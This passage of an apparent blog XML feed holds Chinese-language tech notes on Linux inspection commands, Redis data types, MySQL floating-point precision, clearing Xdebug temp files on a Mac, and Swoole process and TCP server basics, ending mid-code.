class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ iptables -L</span><br></pre></td></tr></table></figure><h4 id="查看路由表"><a href="#查看路由表" class="headerlink" title="查看路由表"></a>查看路由表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ route -n</span><br></pre></td></tr></table></figure><h4 id="查看所有监听端口"><a href="#查看所有监听端口" class="headerlink" title="查看所有监听端口"></a>查看所有监听端口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -lntp</span><br></pre></td></tr></table></figure><h4 id="查看所有已经建立的连接"><a href="#查看所有已经建立的连接" class="headerlink" title="查看所有已经建立的连接"></a>查看所有已经建立的连接</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -antp</span><br></pre></td></tr></table></figure><h4 id="查看网络统计信息"><a href="#查看网络统计信息" class="headerlink" title="查看网络统计信息"></a>查看网络统计信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -s</span><br></pre></td></tr></table></figure><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><h4 id="查看所有进程"><a href="#查看所有进程" class="headerlink" title="查看所有进程"></a>查看所有进程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ps -ef</span><br></pre></td></tr></table></figure><h4 id="实时显示进程状态"><a href="#实时显示进程状态" class="headerlink" title="实时显示进程状态"></a>实时显示进程状态</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ top</span><br></pre></td></tr></table></figure><h3 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h3><h4 id="查看活动用户"><a href="#查看活动用户" class="headerlink" title="查看活动用户"></a>查看活动用户</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ w</span><br></pre></td></tr></table></figure><h4 id="查看指定用户信息"><a href="#查看指定用户信息" class="headerlink" title="查看指定用户信息"></a>查看指定用户信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ id &lt;用户名&gt;</span><br></pre></td></tr></table></figure><h4 id="查看用户登录日志"><a href="#查看用户登录日志" class="headerlink" title="查看用户登录日志"></a>查看用户登录日志</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ last</span><br></pre></td></tr></table></figure><h4 id="查看系统所有用户"><a href="#查看系统所有用户" class="headerlink" title="查看系统所有用户"></a>查看系统所有用户</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cut -d: -f1 &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h4 id="查看系统所有组"><a href="#查看系统所有组" class="headerlink" title="查看系统所有组"></a>查看系统所有组</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cut -d: -f1 &#x2F;etc&#x2F;group</span><br></pre></td></tr></table></figure><h4 id="查看当前用户的计划任务"><a href="#查看当前用户的计划任务" class="headerlink" title="查看当前用户的计划任务"></a>查看当前用户的计划任务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ crontab -l</span><br></pre></td></tr></table></figure><h3 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h3><h4 id="列出所有系统服务"><a href="#列出所有系统服务" class="headerlink" title="列出所有系统服务"></a>列出所有系统服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ chkconfig --list</span><br></pre></td></tr></table></figure><h4 id="列出所有启动的系统服务"><a href="#列出所有启动的系统服务" class="headerlink" title="列出所有启动的系统服务"></a>列出所有启动的系统服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ chkconfig --list | grep on</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://my.oschina.net/hunterli/blog/140783" target="_blank" rel="noopener">Linux 查看CPU信息，机器型号，内存等信息</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis 常用数据类型整理</title>
      <link href="/redis-common-data-types-sorting/"/>
      <url>/redis-common-data-types-sorting/</url>
      
        <content type="html"><![CDATA[<p>Redis 的五种数据类型分别是：字符串、哈希、列表、集合、有序集合。</p><a id="more"></a><h2 id="string"><a href="#string" class="headerlink" title="string"></a>string</h2><p>String 是Redis 最基本的数据类型，一个 Key 对应一个 Value。</p><p>String 类型是二进制安全的。意思是 Redis 的 String 可以包含任何数据。（数字：整浮型点数，二进制：图片、音频、视频、序列化的对象）</p><p>String 类型是 Redis 最基本的数据类型，一个键最大能存储 512 MB。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201107122134.png" alt=""></p><h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><ul><li><code>incr</code>：计数</li><li><code>set</code> + <code>get</code>：将对象/Json 序列化之后存储作为Cache</li></ul><h3 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h3><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220905134752.png" alt=""></p><h2 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h2><p>Redis hash 是一个键值对集合。</p><p>Redis hash 是一个 String 类型的 field 和 value 的映射表，hash 特别适合用于存储对象。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201107123137.png" alt=""></p><h3 id="应用场景-1"><a href="#应用场景-1" class="headerlink" title="应用场景"></a>应用场景</h3><ul><li><code>hset</code> + <code>hget</code>：Cache</li></ul><h3 id="快速上手-1"><a href="#快速上手-1" class="headerlink" title="快速上手"></a>快速上手</h3><p>在下面的例子中，“rediscomcn” 是 Redis 哈希，它包含详细信息（name，url，rank，visitors）属性。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220905134804.png" alt=""></p><h2 id="list"><a href="#list" class="headerlink" title="list"></a>list</h2><p>用来存储多个有序的字符串，一个列表最多可以存 2 的 32 次方减 1 个元素。</p><p>列表的特点是：</p><ol><li>有序</li><li>允许重复</li></ol><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201107122342.png" alt=""></p><h3 id="应用场景-2"><a href="#应用场景-2" class="headerlink" title="应用场景"></a>应用场景</h3><ul><li><code>lpush</code> + <code>lpop</code>：Stack</li><li><code>lpush</code> + <code>rpop</code>：Queue</li><li><code>lpush</code> + <code>ltrim</code>：Capped Collection</li><li><code>lpush</code> + <code>brpop</code>：Message Queue</li></ul><h3 id="快速上手-2"><a href="#快速上手-2" class="headerlink" title="快速上手"></a>快速上手</h3><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220905134813.png" alt=""></p><h2 id="set"><a href="#set" class="headerlink" title="set"></a>set</h2><p>集合特点：</p><ol><li>无序</li><li>不允许重复</li></ol><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201107122610.png" alt=""></p><h3 id="应用场景-3"><a href="#应用场景-3" class="headerlink" title="应用场景"></a>应用场景</h3><ul><li><code>sadd</code>：Tagging</li><li><code>spop/srandmember</code>：Random item</li><li><code>add</code> + <code>sinter</code>：Social Graph</li></ul><h3 id="快速上手-3"><a href="#快速上手-3" class="headerlink" title="快速上手"></a>快速上手</h3><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220905134823.png" alt=""></p><h2 id="sorted-set"><a href="#sorted-set" class="headerlink" title="sorted set"></a>sorted set</h2><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201107123412.png" alt=""></p><h3 id="应用场景-4"><a href="#应用场景-4" class="headerlink" title="应用场景"></a>应用场景</h3><ul><li><code>zscore</code>：timeStamp、saleCount、followCount</li></ul><h3 id="快速上手-4"><a href="#快速上手-4" class="headerlink" title="快速上手"></a>快速上手</h3><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220905134845.png" alt=""></p><h2 id="列表、集合、有序集合的区别"><a href="#列表、集合、有序集合的区别" class="headerlink" title="列表、集合、有序集合的区别"></a>列表、集合、有序集合的区别</h2><table><thead><tr><th>数据结构</th><th>是否允许元素重</th><th>是否有序</th><th>有序实现方式</th><th>应用场景</th></tr></thead><tbody><tr><td>列表</td><td>是</td><td>是</td><td>索引下标</td><td>时间轴，消息队列</td></tr><tr><td>集合</td><td>否</td><td>否</td><td>无</td><td>标签，社交</td></tr><tr><td>有序集合</td><td>否</td><td>是</td><td>分值</td><td>排行榜，点赞数</td></tr></tbody></table><h2 id="通用命令"><a href="#通用命令" class="headerlink" title="通用命令"></a>通用命令</h2><p>查看所有key：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keys *</span><br></pre></td></tr></table></figure><p>查看加载配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config get *</span><br></pre></td></tr></table></figure><p>当前数据库的 key 的数量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dbsize</span><br></pre></td></tr></table></figure><p>判断key 是否存在：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exists key</span><br></pre></td></tr></table></figure><p>删除key：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del key</span><br></pre></td></tr></table></figure><p>查看key 的类型：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type key</span><br></pre></td></tr></table></figure><p>查看内存使用情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info memory</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql 如何选择 Float、Double、Decimal</title>
      <link href="/how-does-mysql-choose-float-double-decimal/"/>
      <url>/how-does-mysql-choose-float-double-decimal/</url>
      
        <content type="html"><![CDATA[<p>我们知道在Mysql 中存储小数有三种数据类型可做选择，究竟该选择哪一种数据格式，其实并没有统一的答案，得根据实际场景去分析，哪一种更合适。</p><a id="more"></a><h2 id="场景重现"><a href="#场景重现" class="headerlink" title="场景重现"></a>场景重现</h2><p>先来看这样一个例子，假设目前有一张表用来存储用户的积分</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE &#96;table1&#96; (</span><br><span class="line">  &#96;integral&#96; float(10,2) DEFAULT NULL</span><br><span class="line">) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8;</span><br></pre></td></tr></table></figure><p>然后向这张表中插入一条数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; INSERT INTO &#96;table1&#96; (&#96;integral&#96;) VALUES (131072.32);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT * FROM &#96;table1&#96;;</span><br><span class="line">+-----------+</span><br><span class="line">| integral  |</span><br><span class="line">+-----------+</span><br><span class="line">| 131072.31 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>通过查询数据表可以看到该条记录并不是<code>131072.32</code> 而是<code>131072.31</code>，为什么会这样？这个问题间接暴露出了其他什么问题？</p><ol><li>丢失数据是否是正常现象？</li><li>为什么会少0.01，有没有可能少0.02，或者少1，少10甚至少100？</li><li>怎么样才能让我们的数据尽量准确？</li></ol><h2 id="精度是如何丢失的"><a href="#精度是如何丢失的" class="headerlink" title="精度是如何丢失的"></a>精度是如何丢失的</h2><p>数值类型存储需求<br>|列类型|存储需求|分配内存空间|<br>|-|-|-|<br>|FLOAT(p)|如果0 &lt;= p &lt;= 24为4个字节, 如果25 &lt;= p &lt;= 53为8个字节|32,64|<br>|FLOAT|4个字节|32|<br>|DOUBLE [PRECISION], item REAL|8个字节|64|<br>|DECIMAL(M,D), NUMERIC(M,D)|变长||</p><p>通过查阅<a href="https://www.mysqlzh.com/doc/106/276.html" target="_blank" rel="noopener">官方文档</a>，可以看到<br>在计算机的世界中，浮点数进行存储时，必须要先转换为二进制，通俗一点讲也就是浮点数的精度实际上是由二进制的精度来决定的。</p><p>我们知道对于float类型的数据，只分配了32位的存储空间，对于double类型值分配了64位，但是并不是所有的实数都能转成32位或者64位的二进制形式，<strong>如果超过了，就会出现截断，这就是误差的来源</strong>。</p><p>比如将上面例子中的 <code>131072.32</code> 转成二进制后的数据为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">100000000000000000.0101000111101011100001010001111010111000010100011111…</span><br></pre></td></tr></table></figure><p>这是一个无穷数，对于float 类型，只能截取前32位进行存储，对于double只能截取前64位进行存储。</p><ul><li>对于 float 而言，最终存储的值是：<code>01001000000000000000000000010100</code></li><li>对于 double 而言，最终存储的值是：<code>0100000100000000000000000000001010001111010111000010100011110101</code></li></ul><p>所以我们暂时可以得出一个结论：</p><h2 id="认识Float、Decimal"><a href="#认识Float、Decimal" class="headerlink" title="认识Float、Decimal"></a>认识Float、Decimal</h2><p>Float 和 Decimal 这类数据类型都可以通过两位参数来控制其精度。</p><p>其存储格式是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLOAT&#x2F;DECIMAIL [(M,D)] [UNSIGNED] [ZEROFILL]</span><br></pre></td></tr></table></figure><h3 id="常见误区"><a href="#常见误区" class="headerlink" title="常见误区"></a>常见误区</h3><ol><li>精度总能精确到D 位。</li></ol><p>存储空间大小决定存储精度，和D值无关，Float 的存储空间只有32 位，当需要存储的二进制大于32 位时，就会截断（四舍五入）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create table table2 (integral float(15,2));</span><br><span class="line">Query OK, 0 rows affected (0.02 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into table2 values (123456789.39);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from table2;</span><br><span class="line">+--------------+</span><br><span class="line">| integral     |</span><br><span class="line">+--------------+</span><br><span class="line">| 123456792.00 |</span><br><span class="line">+--------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><ol start="2"><li>数据存储只能存储到D 位</li></ol><p>浮点型数据最终都要被转成二进制进行存储。并且对于float 而言，存储类型只能是32位0和1的组合。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from table1;</span><br><span class="line">+-----------+</span><br><span class="line">| integral  |</span><br><span class="line">+-----------+</span><br><span class="line">| 131072.31 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; alter table table1 modify integral float(10,4);</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">Records: 0  Duplicates: 0  Warnings: 0</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from table1;</span><br><span class="line">+-------------+</span><br><span class="line">| integral    |</span><br><span class="line">+-------------+</span><br><span class="line">| 131072.3125 |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p><code>DECIMAL(M,D)</code>中，D 值的是小数部分的位数。可以看到，当修改了D 的值，这个时候可以看到MySQL 真正存储的数值也发生了变化。</p><ol start="3"><li>int(3)/int(5) 区别</li></ol><ul><li>正常显示没有区别。</li><li>3 和 5 仅是最小显示宽度而已，并不代表最多存储宽度。</li><li>有 zerofill 等扩展属性时则显示有区别。</li></ul><p>总结：</p><ol><li>若插入的值未指定小数部分或者小数部分不足D 位则会自动补到D 位小数。</li><li>若插入的值小数部分超过了D 为则会发生截断，截取前D 位小数(四舍五入截取)。</li><li>M 值指是整数部分加小数部分的总长度，也即插入的数字整数部分不能超过M-D 位，否则不能成功插入，会报超出范围的错误。</li></ol><h3 id="如何选择Float、Double、Decimal"><a href="#如何选择Float、Double、Decimal" class="headerlink" title="如何选择Float、Double、Decimal"></a>如何选择Float、Double、Decimal</h3><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="http://blog.leanote.com/post/weibo-007/mysql_float_double_decimal" target="_blank" rel="noopener">MySQL如何选择float, double, decimal</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mac 临时文件占用过多磁盘空间</title>
      <link href="/mac-temporary-files-take-up-too-much-disk-space/"/>
      <url>/mac-temporary-files-take-up-too-much-disk-space/</url>
      
        <content type="html"><![CDATA[<p>最近使用Mac 时，被告知磁盘空间严重不足了，我心想最近又没有下载什么大文件，怎么会突然满盘了。</p><a id="more"></a><p>于是使用DaisyDisk 扫描了一下磁盘空间，发现其中多达 186 G 全是临时文件。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/%E7%A3%81%E7%9B%98.jpg" alt=""></p><p>起初以为是系统产生的临时文件。因为并不知道这些文件是如何产生的，所以也不太敢直接删除，只尝试过重启电脑但并没有用。</p><p>后来通过Apple 社区提问才了解到，原来<code>cachegrind.out</code> 这类文件全是 Xdebug 的输出文件！所以是可以直接删除掉的～</p><p>此前从未清理过这类文件，所以才会导致临时文件如此之大…</p><p>可以打开终端，使用如下命令进行清理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo rm -rf &#x2F;private&#x2F;var&#x2F;tmp&#x2F;cachegrind.out.*</span><br><span class="line"></span><br><span class="line"># 或者</span><br><span class="line">sudo find &#x2F;private&#x2F;var&#x2F;tmp -name &quot;cachegrind*&quot; -exec rm -rf &#123;&#125; \;</span><br></pre></td></tr></table></figure><p>因为本地应用的Xdebug 一直都是开启着的，所以请求该应用时，Xdebug 就会将调试信息输出至临时文件了，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201105140351.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Skill </tag>
            
            <tag> Mac </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Swoole 基础知识学习</title>
      <link href="/swoole-basic-knowledge-learning/"/>
      <url>/swoole-basic-knowledge-learning/</url>
      
        <content type="html"><![CDATA[<p>这篇笔记用来记录Swoole 基础知识的学习。</p><a id="more"></a><h2 id="Master、Manager、Worker、Reactor"><a href="#Master、Manager、Worker、Reactor" class="headerlink" title="Master、Manager、Worker、Reactor"></a>Master、Manager、Worker、Reactor</h2><h3 id="Master"><a href="#Master" class="headerlink" title="Master"></a>Master</h3><p>Master 进程是一个多线程进程。</p><h3 id="Manager-进程"><a href="#Manager-进程" class="headerlink" title="Manager 进程"></a>Manager 进程</h3><p>负责创建 / 回收 worker/task 进程</p><h3 id="Worker-进程"><a href="#Worker-进程" class="headerlink" title="Worker 进程"></a>Worker 进程</h3><ul><li>接受由 Reactor 线程投递的请求数据包，并执行 PHP 回调函数处理数据</li><li>生成响应数据并发给 Reactor 线程，由 Reactor 线程发送给 TCP 客户端</li><li>可以是异步非阻塞模式，也可以是同步阻塞模式</li><li>Worker 以多进程的方式运行</li></ul><h3 id="Reactor-线程"><a href="#Reactor-线程" class="headerlink" title="Reactor 线程"></a>Reactor 线程</h3><ul><li>Reactor 线程是在 Master 进程中创建的线程</li><li>负责维护客户端 TCP 连接、处理网络 IO、处理协议、收发数据</li><li>不执行任何 PHP 代码</li><li>将 TCP 客户端发来的数据缓冲、拼接、拆分成完整的一个请求数据包</li></ul><p>有一个更加通俗的比喻来描述这三者的关系：<br>假设 <code>Server</code> 就是一个工厂，那 <code>Reactor</code> 就是销售，接受客户订单。而 <code>Worker</code>就是工人，当销售接到订单后，<code>Worker</code>去工作生产出客户要的东西，而 <code>TaskWorker</code> 可以理解为行政人员，可以帮助 <code>Worker</code> 干些杂事，让 <code>Worker</code>专心工作。</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>IPv4 使用 127.0.0.1 表示监听本机，0.0.0.0 表示监听所有地址<br>IPv6 使用::1 表示监听本机，:: (相当于 0:0:0:0) 表示监听所有地址</p><h3 id="TCP-协议"><a href="#TCP-协议" class="headerlink" title="TCP 协议"></a>TCP 协议</h3><p>TCP (Transmission Control Protocol 传输控制协议）协议是一种面向连接的，可靠的，基于字节流的传输通信协议。</p><h3 id="UDP-协议"><a href="#UDP-协议" class="headerlink" title="UDP 协议"></a>UDP 协议</h3><p>UDP (User Datagram Protocol 用户数据报协议）是一种无连接的传输层协议，提供面向事务的简单不可靠信息传送服务。</p><p>UDP 服务器与 TCP 服务器不同，UDP 没有连接的概念。启动 Server 后，客户端无需 Connect，直接可以向 Server 监听的 9502 端口发送数据包。</p><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><h3 id="TCP-“粘包”问题"><a href="#TCP-“粘包”问题" class="headerlink" title="TCP “粘包”问题"></a>TCP “粘包”问题</h3><p>首先来解释以下所谓的“粘包”问题其本质是什么。</p><p>服务端建立服务，客户端向服务端发起连接，正常情况下，服务端的每次 send，客户端都能正常 recv。但在并发的情况下，服务端的两次send 或者更多次 sned，客户端可能一次就 recv了。</p><p>所以这就导致“粘包”问题的产生。</p><p>TCP 协议的本质是流协议，它只会保证保证发送方以什么顺序发送字节，接收方就一定能按这个顺序接收到。所以所谓的“粘包”问题不应该是传输层的问题，而是应用层的问题。</p><h3 id="无法连接到服务器的简单检测手段"><a href="#无法连接到服务器的简单检测手段" class="headerlink" title="无法连接到服务器的简单检测手段"></a>无法连接到服务器的简单检测手段</h3><ol><li>在 Linux 下，使用 <code>netstat -an | grep</code> 端口，查看端口是否已经被打开处于 Listening 状态</li><li>上一步确认后，再检查防火墙问题，这里的防火墙指的是机器本身的防火墙，如果是云服务器，那么还包括云的防火墙。</li><li>注意服务器所使用的 IP 地址，如果是 <code>127.0.0.1</code> 回环地址，则客户端只能使用 <code>127.0.0.1</code> 才能连接上，所以如果希望其他机器也能访问本机，那就使用<code>0.0.0.0</code>。</li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.zhihu.com/question/20210025" target="_blank" rel="noopener">怎么解决TCP网络传输「粘包」问题？</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Swoole </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Swoole Tcp 学习</title>
      <link href="/swoole-tcp-learning/"/>
      <url>/swoole-tcp-learning/</url>
      
        <content type="html"><![CDATA[<p>最近一直在学习Swoole，刚好有个老项目的一小部分(一个脚本)有用到了Tcp 协议，借此机会重构一下。</p><a id="more"></a><h3 id="场景描述："><a href="#场景描述：" class="headerlink" title="场景描述："></a>场景描述：</h3><p>该脚本的作用用一句话就可以概述：将本地数据源推送给另外一台服务器。</p><p>原始的处理方式，不合理的地方有以下几点：</p><ol><li>目标服务器需要开放指定端口，这会导致目标服务器向外暴露，不安全。</li><li>如果有多台目标服务器，这会导致频繁需要修改源码，脚本维护起来不方便。</li></ol><h3 id="重构"><a href="#重构" class="headerlink" title="重构"></a>重构</h3><p>重构需要解决的问题有如下：</p><ol><li>当客户端连接成功后，才会向该客户端推送数据。</li><li>当客户端断开连接时，停止向该客户端推送数据。</li><li>允许多个客户端同时连接。</li><li>因为数据源是不间断的，理论上只要客户端的连接不主动断开，服务端的数据推送就不会主动停止。</li></ol><p>最终使用Swoole 的Tcp + Process 实现了以上需求，核心代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">use Swoole\Process;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 创建Server 对象，监听本地 9501 端口。</span><br><span class="line"> *&#x2F;</span><br><span class="line">$server &#x3D; new Swoole\Server(&quot;0.0.0.0&quot;, 9501);</span><br><span class="line"></span><br><span class="line">$workers &#x3D; [];</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 监听连接进入事件</span><br><span class="line"> *&#x2F;</span><br><span class="line">$server-&gt;on(&quot;Connect&quot;, function ($server, $fd) &#123;</span><br><span class="line">global $workers;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 创建子进程</span><br><span class="line">$process &#x3D; new swoole_process(function (swoole_process $worker) use ($server, $fd) &#123;</span><br><span class="line">echo &quot;Client Connect&quot; . PHP_EOL;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; todo 业务逻辑</span><br><span class="line">  ...</span><br><span class="line">   </span><br><span class="line">  &#x2F;&#x2F; 向客户端推送消息   </span><br><span class="line">  $server-&gt;send($fd, $str);</span><br><span class="line">  </span><br><span class="line">&#125;, true, 0, false);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 启动子进程</span><br><span class="line">$pid &#x3D; $process-&gt;start();</span><br><span class="line"></span><br><span class="line">array_push($workers, [&quot;pid&quot; &#x3D;&gt; $pid, &quot;fd&quot; &#x3D;&gt; $fd]);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 监听数据接收事件</span><br><span class="line"> *&#x2F;</span><br><span class="line">$server-&gt;on(&quot;Receive&quot;, function ($server, $fd, $from_id, $data)&#123;</span><br><span class="line">$server-&gt;send($fd, &quot;Server: &quot; . $data);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 监听连接关闭事件</span><br><span class="line"> *&#x2F;</span><br><span class="line">$server-&gt;on(&quot;Close&quot;, function ($server, $fd) &#123;</span><br><span class="line">global 